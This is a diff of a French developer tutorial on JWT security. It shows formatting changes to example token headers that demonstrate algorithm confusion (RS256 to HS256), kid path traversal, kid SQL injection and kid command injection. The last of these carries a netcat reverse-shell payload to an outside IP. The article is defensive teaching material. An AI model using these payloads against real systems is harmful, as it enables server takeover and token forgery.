@@ -1,11 +1,13 @@
-<span id="intro"></span>
-*Disclaimer : cet article est une vue d’ensemble destinée aux développeurs, j'ai fais des approximations sur pas mal de sujets ; je m’excuse d’avance si ça vous dérange, et je suis ouvert à tout retour par mail [nas2pwn@protonmail.com](mailto:nas2pwn@protonmail.com) ou sur twitter [@nas2pwn](https://twitter.com/nas2pwn) :smiley:*
+# JWT et sécurité pour le développeur
+
+*Disclaimer : cet article est une vue d’ensemble destinée aux développeurs, j'ai fais des approximations sur pas mal de sujets ; je m’excuse d’avance si ça vous dérange, et je suis ouvert à tout retour par mail [nas2pwn@protonmail.com](mailto:nas2pwn@protonmail.com) ou sur twitter [@nas2pwn](https://twitter.com/nas2pwn) 😀*
 
 Dans cet article :
 1. [Intro](#intro)
 2. [JWT c'est quoi ?](#jwt-ckois)
 3. [Les erreurs à éviter](#erreurs)
 
+<span id="intro"></span>
 Si vous vous intéressez à JWT, c’est que vous êtes familiers avec le développement web ou mobile, et avec la notion de session côté serveur. Il est même possible que de doux souvenirs de `session_start()` et de `var_dump()` vous viennent en tête à la lecture de l’article !
 
 Pour rappel, le principe de la session côté serveur est le suivant : le serveur génère un identifiant (le fameux `PHPSESSID` en PHP) qu’il associe à un tableau associatif (`$_SESSION[]` en PHP) et qu’il retourne au client sous forme de cookie (via l’en-tête `Set-Cookie`).
@@ -197,12 +199,12 @@ Maintenant, un cas plus complexe. Imaginons une application gérant la signature
 
 On ne peut à priori pas signer de jeton avec la clé publique uniquement, sauf si on remplace RSA par HMAC dans `alg` !
 
-<pre><code class="language-json">
+```json
 {
- "<span class="hljs-attribute">alg</span>" : <span class="hljs-value"><span class="hljs-string"><strike>"RS256"</strike> "HS256"</span></span>,
- "<span class="hljs-attribute">typ</span>" : <span class="hljs-value"><span class="hljs-string">"JWT"</span></span>
+ "alg" : <strike>"RS256"</strike> "HS256",
+ "typ" : "JWT"
 }
-</code></pre>
+```
 
 En effet, le serveur va penser que la clé publique utilisée pour vérifier le jeton est également la clé à utiliser pour signer le jeton, car HMAC est une méthode de chiffrement symétrique.
 
@@ -294,22 +296,22 @@ Un pirate peut modifier le KID de son jeton pour pointer vers un fichier du serv
 
 Header
 
-<pre><code class="language-json">
+```json
 {
-	"<span class="hljs-attribute">alg</span>" : <span class="hljs-value"><span class="hljs-string">"HS256"</span></span>,
-	"<span class="hljs-attribute">typ</span>" : <span class="hljs-value"><span class="hljs-string">"JWT"</span></span>,
-	"<span class="hljs-attribute">kid</span>" : <span class="hljs-value"><span class="hljs-string"><strike>"secret.key"</strike> "../www/html/robots.txt"</span></span>
+	"alg" : "HS256",
+	"typ" : "JWT",
+	"kid" : <strike>"secret.key"</strike> "../www/html/robots.txt"
 }
-</code></pre>
+```
 
 Payload
 
-<pre><code class="language-json">
+```json
 {
-	"<span class="hljs-attribute">username</span>" : <span class="hljs-value"><span class="hljs-string">"h4xor"</span></span>,
-	"<span class="hljs-attribute">isAdmin</span>" : <span class="hljs-value"><span class="hljs-number"><strike>0</strike> 1</span></span>
+	"username" : "h4xor",
+	"isAdmin" : <strike>0</strike> 1
 }
-</code></pre>
+``` 
 
 Il lui suffit ensuite de signer son faux jeton avec le contenu du fichier `robots.txt`, puis de le soumettre au serveur !
 
@@ -331,13 +333,13 @@ Si le KID n'est pas filtré contre les injections SQL, l'attaquant peut alors in
 
 Ici il insère son propre secret dans la base de données, la clé d'ID 72 de la table sera `je tai hacke mdr` :
 
-<pre><code class="language-json">
+```json
 {
-	"<span class="hljs-attribute">alg</span>" : <span class="hljs-value"><span class="hljs-string">"HS256"</span></span>,
-	"<span class="hljs-attribute">typ</span>" : <span class="hljs-value"><span class="hljs-string">"JWT"</span></span>,
-	"<span class="hljs-attribute">kid</span>" : <span class="hljs-value"><span class="hljs-number"><strike>2</strike></span></span> <span class="hljs-value"><span class="hljs-string">"2; <code class="language-sql"><span class="hljs-operator"><span class="hljs-keyword">INSERT INTO</span> secrets <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">72</span>,<span class="hljs-string">'je tai hacke mdr'</span>);<span class="hljs-comment">--</span></span></code>"</span>
+	"alg" : "HS256",
+	"typ" : "JWT",
+	"kid" : <strike>2</strike> "2; INSERT INTO secrets VALUES (72,'je tai hacke mdr');--"
 }
-</code></pre>
+```
 
 Il lui suffit ensuite de fabriquer son jeton et de le signer avec le secret qu'il a inséré, en indiquant bien le KID 72 dans le header :
 
@@ -365,13 +367,13 @@ Ici le problème est évident, l'utilisateur peut injecter ses propres commandes
 
 Ainsi, la lecture d'un jeton avec ce header
 
-<pre><code class="language-json">
+```json
 {
-	"<span class="hljs-attribute">alg</span>" : <span class="hljs-value"><span class="hljs-string">"HS256"</span>,
-	"<span class="hljs-attribute">typ</span>" : <span class="hljs-value"><span class="hljs-string">"JWT"</span>,
-	"<span class="hljs-attribute">kid</span>" : <span class="hljs-value"><span class="hljs-number"><strike>2</strike></span></span> <span class="hljs-value"><span class="hljs-string">"2; rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 12.34.56.78 1234 > f"</span>
+	"alg" :"HS256",
+	"typ" : "JWT",
+	"kid" : <strike>2</strike> "2; rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 12.34.56.78 1234 > f"
 }
-</code></pre>
+```
 
 génèrera un reverse shell vers la machine du pirate, qu'il pourra utiliser pour exécuter les commandes qu'il souhaite sur notre serveur web.
 
@@ -405,7 +407,7 @@ Et c’est particulièrement gênant quand on s’en sert pour authentifier les 
 
 Si on délivre un jeton qui a une durée de vie de 1 an à un utilisateur, et qu’on se rend compte que c’est un usurpateur d'identité, on est incapables de le lui révoquer : il pourra encore usurper pendant un an !
 
-Heureusement, il existe des solutions à ce problème :smiley:
+Heureusement, il existe des solutions à ce problème 😀
 
 ##### Solution clean
 
@@ -477,4 +479,4 @@ Pour vérifier un jeton, il faudra utiliser le même procédé de hachage afin d
 <br>
 Félicitations ! Vous êtes maintenant capables d'implanter JWT sur votre application en toute sécurité !
 
-Si avez des questions, ou que vous voulez que je sécurise votre site web : contactez moi par mail à [nas2pwn@protonmail.com](mailto:nas2pwn@protonmail.com) ou par DM twitter [@nas2pwn](https://twitter.com/nas2pwn) :smiley:
+Si avez des questions, ou que vous voulez que je sécurise votre site web : contactez moi par mail à [nas2pwn@protonmail.com](mailto:nas2pwn@protonmail.com) ou par DM twitter [@nas2pwn](https://twitter.com/nas2pwn) 😀
